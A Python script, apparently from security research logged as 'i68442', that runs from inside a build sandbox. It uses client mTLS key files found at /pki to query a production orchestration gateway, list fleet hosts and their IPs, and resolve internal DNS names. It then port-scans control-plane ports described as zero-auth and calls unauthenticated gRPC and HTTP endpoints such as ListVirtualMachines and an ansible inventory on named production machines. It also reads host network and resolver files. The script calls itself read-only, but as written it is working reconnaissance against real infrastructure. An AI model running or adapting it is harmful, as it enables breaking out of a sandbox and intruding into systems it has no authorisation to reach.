#!/usr/bin/env python3
# i68442: from a Railway metal build sandbox (datapacket vantage) test the
# zero-auth node control-plane ports on a small sample of fleet stackers.
# READ-ONLY. One connect per (target,port). No write RPC is ever called.
import os, sys, socket, struct, subprocess, re, json, time, ipaddress, random, threading

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CRT = '/pki/client.crt'; KEY = '/pki/client.key'; CA = '/pki/server-ca-bundle.crt'
T0 = time.time()
BUDGET = 420

PORTS = [8773, 8774, 8080, 8081, 50051, 50052, 50151, 50152]

# 10 sampled metal stackers / build servers (no GCP nodes in this sample)
NAMES = [
    "production-stacker-drsin10a-metal-028-03",
    "production-stacker-aws-us-west-1c-r8i12xlarge-0",
    "production-stacker-aws-us-west-1c-r8i12xlarge-1",
    "production-stacker-cssv9a-metal-001-01",
    "production-stacker-eqsg3a-metal-001-01",
    "production-stacker-drams3a-metal-001-01",
    "production-stacker-eqsv2a-metal-001-01",
    "production-stacker-aws-us-east-1a-r8i12xlarge-0",
    "dpsgp-production-build-server-005",
    "dpsjc-production-build-server-025",
]

def log(*a):
    print("[%6.1fs]" % (time.time() - T0), *a, flush=True)

# ---------------- protobuf / gRPC ----------------
def v(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else:
            o.append(b); return bytes(o)

def fb(f, b):
    if isinstance(b, str): b = b.encode()
    return v((f << 3) | 2) + v(len(b)) + b

def rd(b, i):
    r = 0; s = 0
    while i < len(b):
        x = b[i]; r |= (x & 0x7f) << s; i += 1
        if not x & 0x80: return r, i
        s += 7
    raise ValueError

def parse(b):
    i = 0; o = []
    while i < len(b):
        k, i = rd(b, i); f = k >> 3; w = k & 7
        if w == 0:
            x, i = rd(b, i); o.append((f, 0, x))
        elif w == 2:
            l, i = rd(b, i); o.append((f, 2, b[i:i+l])); i += l
        elif w == 5: o.append((f, 5, b[i:i+4])); i += 4
        elif w == 1: o.append((f, 1, b[i:i+8])); i += 8
        else: raise ValueError
    return o

def call(path, body=b'', t=150, n='1'):
    fu = '/tmp/q' + n
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    q = subprocess.run(['curl', '-sS', '--http2', '--connect-timeout', '8', '-m', str(t),
                        '-o', '/tmp/o' + n, '--trace-ascii', '/tmp/t' + n, '-w', '%{http_code}',
                        '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
                        '-H', 'te: trailers', '-H', 'content-type: application/grpc',
                        '--data-binary', '@' + fu], capture_output=True, text=True)
    data = open('/tmp/o' + n, 'rb').read() if os.path.exists('/tmp/o' + n) else b''
    tr = open('/tmp/t' + n, 'rb').read().decode('utf-8', 'replace') if os.path.exists('/tmp/t' + n) else ''
    st = re.findall(r'grpc-status:\s*(\d+)', tr, re.I)
    msg = re.findall(r'grpc-message:\s*([^\r\n]*)', tr, re.I)
    pay = b''; i = 0
    while i + 5 <= len(data):
        if data[i] != 0: break
        l = struct.unpack('>I', data[i+1:i+5])[0]
        pay += data[i+5:i+5+l]; i += 5 + l
    return q.stdout.strip(), (int(st[-1]) if st else None), (msg[-1].strip() if msg else ''), pay

# ---------------- env ----------------
def readf(p, n=2500):
    try: return open(p, 'rb').read().decode('utf-8', 'replace')[:n]
    except Exception as e: return 'ERR %s' % e

log('HOSTN', socket.gethostname())
for p in ('/etc/resolv.conf', '/etc/hosts', '/proc/net/route', '/proc/net/fib_trie'):
    t = readf(p)
    log('FILE', p); log(t.replace('\n', ' | ')[:2000])
try:
    log('IPADDR', subprocess.run(['ip', '-o', 'addr'], capture_output=True, text=True).stdout.replace('\n', ' | ')[:2000])
except Exception as e:
    log('IPADDR ERR', e)
try:
    log('EGRESS', subprocess.check_output(['curl', '-sS', '-m', '6', 'https://api.ipify.org'], text=True).strip())
except Exception as e:
    log('EGRESS ERR', str(e)[:120])

# gateway positive control
h, st, msg, pay = call('/orchestrator.OrchestrationService/Health', b'', 20, 'h')
log('GWCTL http=%s st=%s msg=%s' % (h, st, msg[:80]))
if st != 0:
    log('NETFAIL_VANTAGE_NOT_METAL_EGRESS')
    sys.exit(0)

# ---------------- fleet list ----------------
h, st, msg, pay = call('/orchestrator.OrchestrationService/ListStackerHealth', fb(1, b''), 150, 'l')
log('LSH http=%s st=%s paylen=%d' % (h, st, len(pay)))
rows = []
for f, w, x in parse(pay):
    if w == 2 and f == 1:
        row = {}
        for f2, w2, x2 in parse(x):
            row[f2] = (w2, x2)
        rows.append(row)
log('ROWS', len(rows))

def dstr(x):
    if isinstance(x, bytes): return x.decode('utf-8', 'replace')
    return str(x)

def is_ip(a):
    try:
        ipaddress.IPv4Address(a); return True
    except Exception:
        return False

# field stats
from collections import defaultdict
stats = defaultdict(lambda: {'n': 0, 'ips': 0, 'sample': ''})
for r in rows:
    for k, (w, x) in r.items():
        s = stats[k]; s['n'] += 1
        if w == 2:
            a = dstr(x)
            if is_ip(a):
                s['ips'] += 1
                s['sample'] = a
            elif not s['sample']:
                s['sample'] = a[:48]
        elif not s['sample']:
            s['sample'] = 'i:%s' % x
for k in sorted(stats):
    s = stats[k]
    log('FLD f=%d n=%d ips=%d sample=%s' % (k, s['n'], s['ips'], s['sample']))

# id field = 1 (hostname), zone = 3 per earlier work; print all fields for requested names
fleet_names = set()
for r in rows:
    if 1 in r: fleet_names.add(dstr(r[1][1]))
log('FLEET_NAMES', len(fleet_names))

def row_zone(r):
    return dstr(r[3][1]) if 3 in r else ''

want = []
for nm in NAMES:
    if nm in fleet_names:
        want.append(nm)
    else:
        # substitute a healthy node from the same zone
        m = re.match(r'(?:production-stacker|([a-z0-9]+)-production-build-server)', nm)
        if nm.startswith('production-stacker-'):
            z = nm.split('production-stacker-')[1]
            z = re.sub(r'-r8i12xlarge-\d+$', '', z)
            z = re.sub(r'-metal-\d+-\d+$', '', z)
            z = re.sub(r'-n4-\d+$', '', z)
        else:
            z = nm.split('-production-build-server')[0]
        subs = [dstr(r[1][1]) for r in rows
                if row_zone(r) == z and (5 not in r or dstr(r[5][1]) == 'HEALTHY')]
        log('SUBST', nm, '->', (subs[0] if subs else 'NONE'), 'zone', z)
        if subs: want.append(subs[0])

ip_by_name = {}
for r in rows:
    if 1 not in r: continue
    nm = dstr(r[1][1])
    if nm not in want: continue
    parts = []
    for k in sorted(r):
        w, x = r[k]
        a = dstr(x) if w == 2 else ('i:%s' % x)
        if w == 2 and is_ip(a):
            parts.append('f%d=IP:%s' % (k, a))
            if k != 1: ip_by_name.setdefault(nm, a)
        else:
            if k == 15: a = a[:60]
            parts.append('f%d=%s' % (k, a[:64]))
    log('ROW %s' % ' | '.join(parts))

log('IPMAP', json.dumps(ip_by_name))

# ---------------- DNS ----------------
def enc_name(n):
    o = b''
    for lab in n.rstrip('.').split('.'):
        if not lab: continue
        o += bytes([len(lab)]) + lab.encode()
    return o + b'\x00'

def dns_lookup(name, server, qtype=1, timeout=2.0):
    tid = random.randint(0, 65535)
    q = struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0) + enc_name(name) + struct.pack('>HH', qtype, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
    try:
        s.sendto(q, (server, 53))
        data, _ = s.recvfrom(4096)
    except Exception:
        return []
    finally:
        s.close()
    try:
        qd, an = struct.unpack('>HH', data[4:8])
        i = 12
        for _ in range(qd):
            while data[i] != 0: i += 1 + data[i]
            i += 5
        out = []
        for _ in range(an):
            while data[i] != 0: i += 1 + data[i]
            i += 1
            typ, _cls, _ttl, rdl = struct.unpack('>HHIH', data[i:i+10]); i += 10
            rdata = data[i:i+rdl]; i += rdl
            if typ == 1 and rdl == 4:
                out.append(socket.inet_ntoa(rdata))
        return out
    except Exception:
        return []

resolvers = []
for line in readf('/etc/resolv.conf', 1000).splitlines():
    m = re.match(r'\s*nameserver\s+(\S+)', line)
    if m and ':' not in m.group(1):
        resolvers.append(m.group(1))
if not resolvers:
    resolvers = ['169.254.169.254']
log('RESOLVERS', resolvers)

suffixes = ['', '.railway.internal', '.metal.railway.internal', '.internal',
            '.production.rlwy.net', '.c.railway-infra.internal']
dns_hits = {}
lock = threading.Lock()

def one_dns(nm, res, suf):
    fn = nm + suf
    for qt in (1, 28):
        try:
            r = dns_lookup(fn, res, qt)
        except Exception:
            r = []
        if r:
            with lock:
                dns_hits.setdefault(fn, []).extend(['%s' % x for x in r])
            return

ths = []
for nm in want[:10]:
    for res in resolvers[:3]:
        for suf in suffixes:
            t = threading.Thread(target=one_dns, args=(nm, res, suf), daemon=True)
            t.start(); ths.append(t)
            if len(ths) > 120: break
for t in ths: t.join(timeout=3)
log('DNSHITS', json.dumps(dns_hits)[:2000])
for nm in want:
    if nm not in ip_by_name:
        for k, v in dns_hits.items():
            if k.startswith(nm) and v and not is_ip(v[0]) is False:
                pass
        for k, v in dns_hits.items():
            if k == nm or k.startswith(nm + '.'):
                if v: ip_by_name.setdefault(nm, v[0])
log('IPMAP2', json.dumps(ip_by_name))

# ---------------- port matrix ----------------
def tcp(addr, port, t=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(t)
    t0 = time.time()
    try:
        rc = s.connect_ex((addr, port))
        dt = time.time() - t0
        if rc == 0: return 'OPEN', dt
        if rc in (111, 61): return 'RST', dt
        return 'ERR%d' % rc, dt
    except socket.timeout:
        return 'DROP', time.time() - t0
    except Exception as e:
        return type(e).__name__, time.time() - t0
    finally:
        s.close()

from concurrent.futures import ThreadPoolExecutor
results = {}
def probe(addr):
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = {p: ex.submit(tcp, addr, p) for p in PORTS}
        return {p: futs[p].result() for p in PORTS}

# baseline: localhost
b = probe('127.0.0.1')
log('BASE localhost ' + ' '.join('%d=%s/%.2f' % (p, b[p][0], b[p][1]) for p in PORTS))
# positive control
log('BASE gateway443 %s/%.2f' % tcp('35.247.70.7', 443, 3.0))
log('BASE dns1.1.1.1:53 %s/%.2f' % tcp('1.1.1.1', 53, 3.0))

targets = []
for nm in want:
    ip = ip_by_name.get(nm)
    if ip:
        targets.append((nm, ip))
log('TARGETS', json.dumps(targets))

for nm, ip in targets:
    if time.time() - T0 > BUDGET - 60:
        log('TIMEBUDGET_STOP'); break
    r = probe(ip)
    results[nm] = (ip, r)
    log('TGT %s %s ' % (nm, ip) + ' '.join('%d=%s/%.2f' % (p, r[p][0], r[p][1]) for p in PORTS))
    time.sleep(5)

# ---------------- read-only identification for OPEN ----------------
def http_code(ip, port, path, t=4):
    try:
        p = subprocess.run(['curl', '-sS', '-m', str(t), '-o', '/tmp/hb', '-w', '%{http_code}',
                            'http://%s:%d%s' % (ip, port, path)], capture_output=True, text=True)
        body = open('/tmp/hb', 'rb').read() if os.path.exists('/tmp/hb') else b''
        return p.stdout.strip(), len(body), body[:300]
    except Exception as e:
        return 'ERR', 0, str(e)[:100].encode()

def grpc_h2c(ip, port, path, body=b'', t=4):
    open('/tmp/g.bin', 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    try:
        p = subprocess.run(['curl', '-sS', '--http2-prior-knowledge', '-m', str(t),
                            '-o', '/tmp/go', '-D', '/tmp/gh', '-H', 'content-type: application/grpc',
                            '-H', 'te: trailers', '--data-binary', '@/tmp/g.bin',
                            'http://%s:%d%s' % (ip, port, path)], capture_output=True, text=True)
        hd = open('/tmp/gh', 'rb').read().decode('utf-8', 'replace') if os.path.exists('/tmp/gh') else ''
        ob = open('/tmp/go', 'rb').read() if os.path.exists('/tmp/go') else b''
        st = re.findall(r'grpc-status:\s*(\d+)', hd, re.I)
        return (p.stdout.strip(), (st[-1] if st else '?'), ob[:80].hex())
    except Exception as e:
        return ('ERR', '?', str(e)[:80])

for nm, (ip, r) in results.items():
    for p in PORTS:
        if r[p][0] != 'OPEN':
            continue
        log('IDENT %s:%d' % (ip, p))
        if p in (8080, 8081):
            for path in ('/health', '/healthcheck', '/metrics'):
                c, n, body = http_code(ip, p, path)
                log('  HTTP %s code=%s len=%d body=%s' % (path, c, n, body[:120]))
        elif p == 8774:
            for path in ('/docs/openapi.json', '/ansible/inventory'):
                c, n, body = http_code(ip, p, path)
                keys = ''
                if c == '200' and n:
                    try:
                        j = json.loads(body)
                        keys = sorted(j.keys())[:20] if isinstance(j, dict) else 'n=%d' % len(j)
                    except Exception:
                        keys = 'nonjson'
                log('  METALCP %s code=%s len=%d keys=%s' % (path, c, n, keys))
        elif p in (50051, 50052, 8773):
            log('  GRPC health', grpc_h2c(ip, p, '/grpc.health.v1.Health/Check'))
            log('  GRPC health_svc', grpc_h2c(ip, p, '/grpc.health.v1.Health/Check', fb(1, b'')))
            if p == 8773:
                # read-only: empty ListVirtualMachines (metal_host_agent + metal_cp), and Get nonexistent
                log('  MHA List', grpc_h2c(ip, p, '/metal_host_agent.VirtualMachinesService/ListVirtualMachines'))
                log('  MCP Get(nonexistent)', grpc_h2c(ip, p, '/metal_cp.VirtualMachinesService/GetVirtualMachine', fb(1, 'probe-nonexistent-i68442')))

log('DONE dt=%.1f' % (time.time() - T0))
